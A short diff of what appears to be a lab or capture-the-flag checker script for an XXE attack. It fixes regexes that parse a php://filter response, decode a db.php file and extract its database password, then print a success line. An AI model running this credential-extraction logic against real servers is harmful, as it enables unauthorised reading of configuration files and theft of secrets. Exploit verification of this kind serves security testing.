@@ -71,10 +71,10 @@ xxe_xml = (
 )
 status, xxe_response = submit_xml(xxe_xml)
 assert status == 200, xxe_response[:600]
-match = re.search(r"Reward:\\s*([A-Za-z0-9+/=]+)", xxe_response)
+match = re.search(r"Reward:\s*([A-Za-z0-9+/=]+)", xxe_response)
 assert match, "XXE response did not contain the PHP filter output"
 config_source = base64.b64decode(match.group(1), validate=True).decode("utf-8", "replace")
-password_match = re.search(r'\\$dbpassword\\s*=\\s*"([^"]+)"', config_source)
+password_match = re.search('dbpassword = "([^"]+)"', config_source)
 assert password_match, "The XXE-read db.php source did not contain the expected credential field"
 password = password_match.group(1)
 print("PASS: real PHP/libxml XXE + php://filter disclosed the beta config credential", flush=True)
